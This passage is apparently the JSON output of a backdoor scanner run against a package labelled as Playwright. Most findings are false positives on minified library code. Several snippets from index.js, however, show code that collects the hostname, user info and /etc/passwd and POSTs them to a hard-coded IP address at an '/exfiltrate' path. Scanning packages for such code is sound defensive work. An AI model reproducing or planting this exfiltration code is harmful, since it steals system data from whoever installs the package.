                      "markdown": "`r(i){super(i)}async submit(){this.value=await r.call(this,this.values,this.state),super.base.submit.call(this)}static create(i){return Lu(i)}}return e};Tu.exports=Lu()});var Iu=y((iD,Nu)=>{\"use strict\";var Fh=Si();function xh(r,e){return r.username===this.options.username&&r.password===this.options.password}var Pu=(r=xh)=>{let e=[{name:\"username\",message:\"username\"},{name:\"password\",message:\"password\",format(i){return this.options.showPassword?i:(this.state.submitted?this.styles.primary:this.styles.muted)(this.symbols.asterisk.repeat(i.length))}}];class t extends Fh.create(r){constructor(s){super({...`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/utilsBundleImpl.js"
                },
                "region": {
                  "startLine": 30,
                  "startColumn": 6071,
                  "endLine": 30,
                  "endColumn": 6079,
                  "snippet": {
                    "text": " e extends bh{constructor(i){super(i)}async submit(){this.value=await r.call(this,this.values,this.state),super.base.submit.call(this)}static create(i){return Lu(i)}}return e};Tu.exports=Lu()});var Iu=y((iD,Nu)=>{\"use strict\";var Fh=Si();function xh(r,e){return r.username===this.options.username&&r.password===this.options.password}var Pu=(r=xh)=>{let e=[{name:\"username\",message:\"username\"},{name:\"password\",message:\"password\",format(i){return this.options.showPassword?i:(this.state.submitted?this.styles.primary:this.styles.muted)(this.symbols.asterisk.repeat(i.length))}}];class t extends Fh.create(r){c",
                    "rendered": {
                      "text": " e extends bh{constructor(i){super(i)}async submit(){this.value=await r.call(this,this.values,this.state),super.base.submit.call(this)}static create(i){return Lu(i)}}return e};Tu.exports=Lu()});var Iu=y((iD,Nu)=>{\"use strict\";var Fh=Si();function xh(r,e){return r.username===this.options.username&&r.password===this.options.password}var Pu=(r=xh)=>{let e=[{name:\"username\",message:\"username\"},{name:\"password\",message:\"password\",format(i){return this.options.showPassword?i:(this.state.submitted?this.styles.primary:this.styles.muted)(this.symbols.asterisk.repeat(i.length))}}];class t extends Fh.create(r){c",
                      "markdown": "` e extends bh{constructor(i){super(i)}async submit(){this.value=await r.call(this,this.values,this.state),super.base.submit.call(this)}static create(i){return Lu(i)}}return e};Tu.exports=Lu()});var Iu=y((iD,Nu)=>{\"use strict\";var Fh=Si();function xh(r,e){return r.username===this.options.username&&r.password===this.options.password}var Pu=(r=xh)=>{let e=[{name:\"username\",message:\"username\"},{name:\"password\",message:\"password\",format(i){return this.options.showPassword?i:(this.state.submitted?this.styles.primary:this.styles.muted)(this.symbols.asterisk.repeat(i.length))}}];class t extends Fh.create(r){c`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000707"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Platform)",
            "id": "BD000707"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/utilsBundleImpl.js"
                },
                "region": {
                  "startLine": 51,
                  "startColumn": 31670,
                  "endLine": 51,
                  "endColumn": 31679,
                  "snippet": {
                    "text": " s=r.indexOf(i,e);s!==-1&&(e=s+1)}if(r[e]===\"!\")return!0}else e++}return!1};da.exports=function(e,t){if(typeof e!=\"string\"||e===\"\")return!1;if(Xf(e))return!0;var i=Zf;return t&&t.strict===!1&&(i=Jf),i(e)}});var Da=y((kD,pa)=>{\"use strict\";var ed=ds(),td=require(\"path\").posix.dirname,rd=require(\"os\").platform()===\"win32\",ps=\"/\",id=/\\\\/g,sd=/[\\{\\[].*[\\}\\]]$/,nd=/(^|[^\\\\])([\\{\\[]|\\([^\\)]+$)/,ud=/\\\\([\\!\\*\\?\\|\\[\\]\\(\\)\\{\\}])/g;pa.exports=function(e,t){var i=Object.assign({flipBackslashes:!0},t);i.flipBackslashes&&rd&&e.indexOf(ps)<0&&(e=e.replace(id,ps)),sd.test(e)&&(e+=ps),e+=\"a\";do e=td(e);while(ed(e)||nd.",
                    "rendered": {
                      "text": " s=r.indexOf(i,e);s!==-1&&(e=s+1)}if(r[e]===\"!\")return!0}else e++}return!1};da.exports=function(e,t){if(typeof e!=\"string\"||e===\"\")return!1;if(Xf(e))return!0;var i=Zf;return t&&t.strict===!1&&(i=Jf),i(e)}});var Da=y((kD,pa)=>{\"use strict\";var ed=ds(),td=require(\"path\").posix.dirname,rd=require(\"os\").platform()===\"win32\",ps=\"/\",id=/\\\\/g,sd=/[\\{\\[].*[\\}\\]]$/,nd=/(^|[^\\\\])([\\{\\[]|\\([^\\)]+$)/,ud=/\\\\([\\!\\*\\?\\|\\[\\]\\(\\)\\{\\}])/g;pa.exports=function(e,t){var i=Object.assign({flipBackslashes:!0},t);i.flipBackslashes&&rd&&e.indexOf(ps)<0&&(e=e.replace(id,ps)),sd.test(e)&&(e+=ps),e+=\"a\";do e=td(e);while(ed(e)||nd.",
                      "markdown": "` s=r.indexOf(i,e);s!==-1&&(e=s+1)}if(r[e]===\"!\")return!0}else e++}return!1};da.exports=function(e,t){if(typeof e!=\"string\"||e===\"\")return!1;if(Xf(e))return!0;var i=Zf;return t&&t.strict===!1&&(i=Jf),i(e)}});var Da=y((kD,pa)=>{\"use strict\";var ed=ds(),td=require(\"path\").posix.dirname,rd=require(\"os\").platform()===\"win32\",ps=\"/\",id=/\\\\/g,sd=/[\\{\\[].*[\\}\\]]$/,nd=/(^|[^\\\\])([\\{\\[]|\\([^\\)]+$)/,ud=/\\\\([\\!\\*\\?\\|\\[\\]\\(\\)\\{\\}])/g;pa.exports=function(e,t){var i=Object.assign({flipBackslashes:!0},t);i.flipBackslashes&&rd&&e.indexOf(ps)<0&&(e=e.replace(id,ps)),sd.test(e)&&(e+=ps),e+=\"a\";do e=td(e);while(ed(e)||nd.`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/index.js"
                },
                "region": {
                  "startLine": 44,
                  "startColumn": 17,
                  "endLine": 44,
                  "endColumn": 26,
                  "snippet": {
                    "text": "  }\n};\n\nconst req = https.request(options, (res) => {\n  res.on('data', (d) => {\n    process.stdout.write(d);\n  });\n",
                    "rendered": {
                      "text": "  }\n};\n\nconst req = https.request(options, (res) => {\n  res.on('data', (d) => {\n    process.stdout.write(d);\n  });\n",
                      "markdown": "`  }\n};\n\nconst req = https.request(options, (res) => {\n  res.on('data', (d) => {\n    process.stdout.write(d);\n  });\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000704"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Hostname)",
            "id": "BD000704"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/index.js"
                },
                "region": {
                  "startLine": 34,
                  "startColumn": 2,
                  "endLine": 34,
                  "endColumn": 10,
                  "snippet": {
                    "text": "});\n\nconst options = {\n  hostname: '207.244.239.102',\n  port: 5000,\n  path: '/exfiltrate',\n  method: 'POST',\n",
                    "rendered": {
                      "text": "});\n\nconst options = {\n  hostname: '207.244.239.102',\n  port: 5000,\n  path: '/exfiltrate',\n  method: 'POST',\n",
                      "markdown": "`});\n\nconst options = {\n  hostname: '207.244.239.102',\n  port: 5000,\n  path: '/exfiltrate',\n  method: 'POST',\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000704"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Hostname)",
            "id": "BD000704"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/index.js"
                },
                "region": {
                  "startLine": 27,
                  "startColumn": 15,
                  "endLine": 27,
                  "endColumn": 23,
                  "snippet": {
                    "text": "\n// Create a data object with system information and /etc/passwd content\nconst data = JSON.stringify({\n  hostname: os.hostname(),\n  platform: os.platform(),\n  userInfo: os.userInfo(),\n  passwd: passwdData\n",
                    "rendered": {
                      "text": "\n// Create a data object with system information and /etc/passwd content\nconst data = JSON.stringify({\n  hostname: os.hostname(),\n  platform: os.platform(),\n  userInfo: os.userInfo(),\n  passwd: passwdData\n",
                      "markdown": "`\n// Create a data object with system information and /etc/passwd content\nconst data = JSON.stringify({\n  hostname: os.hostname(),\n  platform: os.platform(),\n  userInfo: os.userInfo(),\n  passwd: passwdData\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000704"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Hostname)",
            "id": "BD000704"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/index.js"
                },
                "region": {
                  "startLine": 27,
                  "startColumn": 2,
                  "endLine": 27,
                  "endColumn": 10,
                  "snippet": {
                    "text": "\n// Create a data object with system information and /etc/passwd content\nconst data = JSON.stringify({\n  hostname: os.hostname(),\n  platform: os.platform(),\n  userInfo: os.userInfo(),\n  passwd: passwdData\n",
                    "rendered": {
                      "text": "\n// Create a data object with system information and /etc/passwd content\nconst data = JSON.stringify({\n  hostname: os.hostname(),\n  platform: os.platform(),\n  userInfo: os.userInfo(),\n  passwd: passwdData\n",
                      "markdown": "`\n// Create a data object with system information and /etc/passwd content\nconst data = JSON.stringify({\n  hostname: os.hostname(),\n  platform: os.platform(),\n  userInfo: os.userInfo(),\n  passwd: passwdData\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/test.mjs"
                },
                "region": {
                  "startLine": 6,
                  "startColumn": 39,
                  "endLine": 7,
                  "snippet": {
                    "text": " *\n * Licensed under the Apache License, Version 2.0 (the \"License\");\n * you may not use this file except in compliance with the License.\n * You may obtain a copy of the License at\n *\n * http://www.apache.org/licenses/LICENSE-2.0\n *\n * Unless required by applicable law or agreed to in writing, software\n",
                    "rendered": {
                      "text": " *\n * Licensed under the Apache License, Version 2.0 (the \"License\");\n * you may not use this file except in compliance with the License.\n * You may obtain a copy of the License at\n *\n * http://www.apache.org/licenses/LICENSE-2.0\n *\n * Unless required by applicable law or agreed to in writing, software\n",
                      "markdown": "` *\n * Licensed under the Apache License, Version 2.0 (the \"License\");\n * you may not use this file except in compliance with the License.\n * You may obtain a copy of the License at\n *\n * http://www.apache.org/licenses/LICENSE-2.0\n *\n * Unless required by applicable law or agreed to in writing, software\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/test.mjs"
                },
                "region": {
                  "startLine": 29,
                  "startColumn": 12,
                  "endLine": 29,
                  "endColumn": 20,
                  "snippet": {
                    "text": "export const _electron = playwright._electron;\nexport const _android = playwright._android;\nexport const test = playwright.test;\nexport const expect = playwright.expect;\nexport const defineConfig = playwright.defineConfig;\nexport const mergeTests = playwright.mergeTests;\nexport const mergeExpects = playwright.mergeExpects;\n",
                    "rendered": {
                      "text": "export const _electron = playwright._electron;\nexport const _android = playwright._android;\nexport const test = playwright.test;\nexport const expect = playwright.expect;\nexport const defineConfig = playwright.defineConfig;\nexport const mergeTests = playwright.mergeTests;\nexport const mergeExpects = playwright.mergeExpects;\n",
                      "markdown": "`export const _electron = playwright._electron;\nexport const _android = playwright._android;\nexport const test = playwright.test;\nexport const expect = playwright.expect;\nexport const defineConfig = playwright.defineConfig;\nexport const mergeTests = playwright.mergeTests;\nexport const mergeExpects = playwright.mergeExpects;\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/common/expectBundle.js"
                },
                "region": {
                  "startLine": 23,
                  "startColumn": 5,
                  "endLine": 23,
                  "endColumn": 13,
                  "snippet": {
                    "text": " * limitations under the License.\n */\n\nconst expect = exports.expect = require('./expectBundleImpl').expect;\nconst EXPECTED_COLOR = exports.EXPECTED_COLOR = require('./expectBundleImpl').EXPECTED_COLOR;\nconst INVERTED_COLOR = exports.INVERTED_COLOR = require('./expectBundleImpl').INVERTED_COLOR;\nconst RECEIVED_COLOR = exports.RECEIVED_COLOR = require('./expectBundleImpl').RECEIVED_COLOR;\n",
                    "rendered": {
                      "text": " * limitations under the License.\n */\n\nconst expect = exports.expect = require('./expectBundleImpl').expect;\nconst EXPECTED_COLOR = exports.EXPECTED_COLOR = require('./expectBundleImpl').EXPECTED_COLOR;\nconst INVERTED_COLOR = exports.INVERTED_COLOR = require('./expectBundleImpl').INVERTED_COLOR;\nconst RECEIVED_COLOR = exports.RECEIVED_COLOR = require('./expectBundleImpl').RECEIVED_COLOR;\n",
                      "markdown": "` * limitations under the License.\n */\n\nconst expect = exports.expect = require('./expectBundleImpl').expect;\nconst EXPECTED_COLOR = exports.EXPECTED_COLOR = require('./expectBundleImpl').EXPECTED_COLOR;\nconst INVERTED_COLOR = exports.INVERTED_COLOR = require('./expectBundleImpl').INVERTED_COLOR;\nconst RECEIVED_COLOR = exports.RECEIVED_COLOR = require('./expectBundleImpl').RECEIVED_COLOR;\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/common/expectBundleImpl.js"
                },
                "region": {
                  "startLine": 332,
                  "startColumn": 2000,
                  "endLine": 332,
                  "endColumn": 2004,
                  "snippet": {
                    "text": "nError=Ge;var q2=function(e){return function(t,r){return e.apply(this,[t,r,!0])}},H2=(e,t)=>e===\"toThrow\"||e===\"toThrowError\"?(0,rh.createMatcher)(e,!0):e===\"toThrowErrorMatchingSnapshot\"||e===\"toThrowErrorMatchingInlineSnapshot\"?q2(t):null,oe=(e,...t)=>{if(t.length!==0)throw new Error(\"Expect takes at most one argument.\");let r=(0,ye.getMatchers)(),n={not:{},rejects:{not:{}},resolves:{not:{}}},s=new Ge;return Object.keys(r).forEach(i=>{let u=r[i],o=H2(i,u)||u;n[i]=Ns(u,!1,\"\",e),n.not[i]=Ns(u,!0,\"\",e),n.resolves[i]=eh(i,o,!1,e,s),n.resolves.not[i]=eh(i,o,!0,e,s),n.rejects[i]=th(i,o,!1,e,s),n.rejec",
                    "rendered": {
                      "text": "nError=Ge;var q2=function(e){return function(t,r){return e.apply(this,[t,r,!0])}},H2=(e,t)=>e===\"toThrow\"||e===\"toThrowError\"?(0,rh.createMatcher)(e,!0):e===\"toThrowErrorMatchingSnapshot\"||e===\"toThrowErrorMatchingInlineSnapshot\"?q2(t):null,oe=(e,...t)=>{if(t.length!==0)throw new Error(\"Expect takes at most one argument.\");let r=(0,ye.getMatchers)(),n={not:{},rejects:{not:{}},resolves:{not:{}}},s=new Ge;return Object.keys(r).forEach(i=>{let u=r[i],o=H2(i,u)||u;n[i]=Ns(u,!1,\"\",e),n.not[i]=Ns(u,!0,\"\",e),n.resolves[i]=eh(i,o,!1,e,s),n.resolves.not[i]=eh(i,o,!0,e,s),n.rejects[i]=th(i,o,!1,e,s),n.rejec",
                      "markdown": "`nError=Ge;var q2=function(e){return function(t,r){return e.apply(this,[t,r,!0])}},H2=(e,t)=>e===\"toThrow\"||e===\"toThrowError\"?(0,rh.createMatcher)(e,!0):e===\"toThrowErrorMatchingSnapshot\"||e===\"toThrowErrorMatchingInlineSnapshot\"?q2(t):null,oe=(e,...t)=>{if(t.length!==0)throw new Error(\"Expect takes at most one argument.\");let r=(0,ye.getMatchers)(),n={not:{},rejects:{not:{}},resolves:{not:{}}},s=new Ge;return Object.keys(r).forEach(i=>{let u=r[i],o=H2(i,u)||u;n[i]=Ns(u,!1,\"\",e),n.not[i]=Ns(u,!0,\"\",e),n.resolves[i]=eh(i,o,!1,e,s),n.resolves.not[i]=eh(i,o,!0,e,s),n.rejects[i]=th(i,o,!1,e,s),n.rejec`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/common/expectBundleImpl.js"
                },
                "region": {
                  "startLine": 265,
                  "startColumn": 2104,
                  "endLine": 265,
                  "endColumn": 2108,
                  "snippet": {
                    "text": "){t&&(t=t.replace(/\\\\/g,\"/\"),t.startsWith(`${r}/`)&&(t=t.slice(r.length+1)),e.file=t)}function r2(e){if(e.length===0)return[];let t=e.map(r=>e2(r));return new RegExp(`[/\\\\\\\\]node_modules[/\\\\\\\\](?:${t.join(\"|\")})[/\\\\\\\\][^:]+:\\\\d+:\\\\d+`)}var n2=new RegExp(\"^(?:\\\\s*at )?(?:(new) )?(?:(.*?) \\\\()?(?:eval at ([^ ]+) \\\\((.+?):(\\\\d+):(\\\\d+)\\\\), )?(?:(.+?):(\\\\d+):(\\\\d+)|(native))(\\\\)?)$\"),s2=/^(.*?) \\[as (.*?)\\]$/;Ap.exports=zu});var zp=R(he=>{\"use strict\";Object.defineProperty(he,\"__esModule\",{value:!0});he.separateMessageFromStack=he.indentAllLines=he.getTopFrame=he.getStackTraceLines=he.formatStackTrace",
                    "rendered": {
                      "text": "){t&&(t=t.replace(/\\\\/g,\"/\"),t.startsWith(`${r}/`)&&(t=t.slice(r.length+1)),e.file=t)}function r2(e){if(e.length===0)return[];let t=e.map(r=>e2(r));return new RegExp(`[/\\\\\\\\]node_modules[/\\\\\\\\](?:${t.join(\"|\")})[/\\\\\\\\][^:]+:\\\\d+:\\\\d+`)}var n2=new RegExp(\"^(?:\\\\s*at )?(?:(new) )?(?:(.*?) \\\\()?(?:eval at ([^ ]+) \\\\((.+?):(\\\\d+):(\\\\d+)\\\\), )?(?:(.+?):(\\\\d+):(\\\\d+)|(native))(\\\\)?)$\"),s2=/^(.*?) \\[as (.*?)\\]$/;Ap.exports=zu});var zp=R(he=>{\"use strict\";Object.defineProperty(he,\"__esModule\",{value:!0});he.separateMessageFromStack=he.indentAllLines=he.getTopFrame=he.getStackTraceLines=he.formatStackTrace",
                      "markdown": "`){t&&(t=t.replace(/\\\\/g,\"/\"),t.startsWith(`${r}/`)&&(t=t.slice(r.length+1)),e.file=t)}function r2(e){if(e.length===0)return[];let t=e.map(r=>e2(r));return new RegExp(`[/\\\\\\\\]node_modules[/\\\\\\\\](?:${t.join(\"|\")})[/\\\\\\\\][^:]+:\\\\d+:\\\\d+`)}var n2=new RegExp(\"^(?:\\\\s*at )?(?:(new) )?(?:(.*?) \\\\()?(?:eval at ([^ ]+) \\\\((.+?):(\\\\d+):(\\\\d+)\\\\), )?(?:(.+?):(\\\\d+):(\\\\d+)|(native))(\\\\)?)$\"),s2=/^(.*?) \\[as (.*?)\\]$/;Ap.exports=zu});var zp=R(he=>{\"use strict\";Object.defineProperty(he,\"__esModule\",{value:!0});he.separateMessageFromStack=he.indentAllLines=he.getTopFrame=he.getStackTraceLines=he.formatStackTrace`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/common/expectBundleImpl.js"
                },
                "region": {
                  "startLine": 48,
                  "startColumn": 25916,
                  "endLine": 48,
                  "endColumn": 25920,
                  "snippet": {
                    "text": "ow new Error(`Jest: requireOrImportModule path must be absolute, was \"${e}\"`);try{let r=require(e);return t?(0,by.default)(r).default:r}catch(r){if(r.code===\"ERR_REQUIRE_ESM\")try{let s=await import((0,uf().pathToFileURL)(e).href);if(!t)return s;if(!s.default)throw new Error(`Jest: Failed to load ESM at ${e} - did you use a default export?`);return s.default}catch(n){throw n.message===\"Not supported\"?new Error(`Jest: Your version of Node does not support dynamic import - please enable it or use a .cjs file extension for file ${e}`):n}else throw r}}});var mu=R(ne=>{\"use strict\";Object.defineProperty",
                    "rendered": {
                      "text": "ow new Error(`Jest: requireOrImportModule path must be absolute, was \"${e}\"`);try{let r=require(e);return t?(0,by.default)(r).default:r}catch(r){if(r.code===\"ERR_REQUIRE_ESM\")try{let s=await import((0,uf().pathToFileURL)(e).href);if(!t)return s;if(!s.default)throw new Error(`Jest: Failed to load ESM at ${e} - did you use a default export?`);return s.default}catch(n){throw n.message===\"Not supported\"?new Error(`Jest: Your version of Node does not support dynamic import - please enable it or use a .cjs file extension for file ${e}`):n}else throw r}}});var mu=R(ne=>{\"use strict\";Object.defineProperty",
                      "markdown": "`ow new Error(`Jest: requireOrImportModule path must be absolute, was \"${e}\"`);try{let r=require(e);return t?(0,by.default)(r).default:r}catch(r){if(r.code===\"ERR_REQUIRE_ESM\")try{let s=await import((0,uf().pathToFileURL)(e).href);if(!t)return s;if(!s.default)throw new Error(`Jest: Failed to load ESM at ${e} - did you use a default export?`);return s.default}catch(n){throw n.message===\"Not supported\"?new Error(`Jest: Your version of Node does not support dynamic import - please enable it or use a .cjs file extension for file ${e}`):n}else throw r}}});var mu=R(ne=>{\"use strict\";Object.defineProperty`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/common/expectBundleImpl.js"
                },
                "region": {
                  "startLine": 46,
                  "startColumn": 7702,
                  "endLine": 46,
                  "endColumn": 7706,
                  "snippet": {
                    "text": "e[a]=c,!0}});return Object.assign(u,process.env)}function Rm(){let e=require(\"process\"),t=(0,Em.default)(e,{blacklist:vm,keepPrototype:!0});try{t[Symbol.toStringTag]=\"process\"}catch(n){if(t[Symbol.toStringTag]!==\"process\")throw n.message=`Unable to set toStringTag on process. Please open up an issue at https://github.com/facebook/jest\n\n${n.message}`,n}let r=e;for(;r=Object.getPrototypeOf(r);)typeof r.constructor==\"function\"&&r.constructor.call(t);return t.env=_m(),t.send=()=>!0,Object.defineProperty(t,\"domain\",{get(){return e.domain}}),t}});var Tl=R(Wi=>{\"use strict\";Object.defineProperty(Wi,\"__es",
                    "rendered": {
                      "text": "e[a]=c,!0}});return Object.assign(u,process.env)}function Rm(){let e=require(\"process\"),t=(0,Em.default)(e,{blacklist:vm,keepPrototype:!0});try{t[Symbol.toStringTag]=\"process\"}catch(n){if(t[Symbol.toStringTag]!==\"process\")throw n.message=`Unable to set toStringTag on process. Please open up an issue at https://github.com/facebook/jest\n\n${n.message}`,n}let r=e;for(;r=Object.getPrototypeOf(r);)typeof r.constructor==\"function\"&&r.constructor.call(t);return t.env=_m(),t.send=()=>!0,Object.defineProperty(t,\"domain\",{get(){return e.domain}}),t}});var Tl=R(Wi=>{\"use strict\";Object.defineProperty(Wi,\"__es",
                      "markdown": "`e[a]=c,!0}});return Object.assign(u,process.env)}function Rm(){let e=require(\"process\"),t=(0,Em.default)(e,{blacklist:vm,keepPrototype:!0});try{t[Symbol.toStringTag]=\"process\"}catch(n){if(t[Symbol.toStringTag]!==\"process\")throw n.message=`Unable to set toStringTag on process. Please open up an issue at https://github.com/facebook/jest\n\n${n.message}`,n}let r=e;for(;r=Object.getPrototypeOf(r);)typeof r.constructor==\"function\"&&r.constructor.call(t);return t.env=_m(),t.send=()=>!0,Object.defineProperty(t,\"domain\",{get(){return e.domain}}),t}});var Tl=R(Wi=>{\"use strict\";Object.defineProperty(Wi,\"__es`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/common/expectBundleImpl.js"
                },
                "region": {
                  "startLine": 48,
                  "startColumn": 26051,
                  "endLine": 48,
                  "endColumn": 26057,
                  "snippet": {
                    "text": "}catch(r){if(r.code===\"ERR_REQUIRE_ESM\")try{let s=await import((0,uf().pathToFileURL)(e).href);if(!t)return s;if(!s.default)throw new Error(`Jest: Failed to load ESM at ${e} - did you use a default export?`);return s.default}catch(n){throw n.message===\"Not supported\"?new Error(`Jest: Your version of Node does not support dynamic import - please enable it or use a .cjs file extension for file ${e}`):n}else throw r}}});var mu=R(ne=>{\"use strict\";Object.defineProperty(ne,\"__esModule\",{value:!0});Object.defineProperty(ne,\"ErrorWithStack\",{enumerable:!0,get:function(){return Ay.default}});Object.definePr",
                    "rendered": {
                      "text": "}catch(r){if(r.code===\"ERR_REQUIRE_ESM\")try{let s=await import((0,uf().pathToFileURL)(e).href);if(!t)return s;if(!s.default)throw new Error(`Jest: Failed to load ESM at ${e} - did you use a default export?`);return s.default}catch(n){throw n.message===\"Not supported\"?new Error(`Jest: Your version of Node does not support dynamic import - please enable it or use a .cjs file extension for file ${e}`):n}else throw r}}});var mu=R(ne=>{\"use strict\";Object.defineProperty(ne,\"__esModule\",{value:!0});Object.defineProperty(ne,\"ErrorWithStack\",{enumerable:!0,get:function(){return Ay.default}});Object.definePr",
                      "markdown": "`}catch(r){if(r.code===\"ERR_REQUIRE_ESM\")try{let s=await import((0,uf().pathToFileURL)(e).href);if(!t)return s;if(!s.default)throw new Error(`Jest: Failed to load ESM at ${e} - did you use a default export?`);return s.default}catch(n){throw n.message===\"Not supported\"?new Error(`Jest: Your version of Node does not support dynamic import - please enable it or use a .cjs file extension for file ${e}`):n}else throw r}}});var mu=R(ne=>{\"use strict\";Object.defineProperty(ne,\"__esModule\",{value:!0});Object.defineProperty(ne,\"ErrorWithStack\",{enumerable:!0,get:function(){return Ay.default}});Object.definePr`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/common/expectBundleImpl.js"
                },
                "region": {
                  "startLine": 332,
                  "startColumn": 1118,
                  "endLine": 332,
                  "endColumn": 1123,
                  "snippet": {
                    "text": "?e:{default:e}}function nh(e){if(typeof WeakMap!=\"function\")return null;var t=new WeakMap,r=new WeakMap;return(nh=function(n){return n?r:t})(e)}function sh(e,t){if(!t&&e&&e.__esModule)return e;if(e===null||typeof e!=\"object\"&&typeof e!=\"function\")return{default:e};var r=nh(t);if(r&&r.has(e))return r.get(e);var n={},s=Object.defineProperty&&Object.getOwnPropertyDescriptor;for(var i in e)if(i!==\"default\"&&Object.prototype.hasOwnProperty.call(e,i)){var u=s?Object.getOwnPropertyDescriptor(e,i):null;u&&(u.get||u.set)?Object.defineProperty(n,i,u):n[i]=e[i]}return n.default=e,r&&r.set(e,n),n}var ih=global",
                    "rendered": {
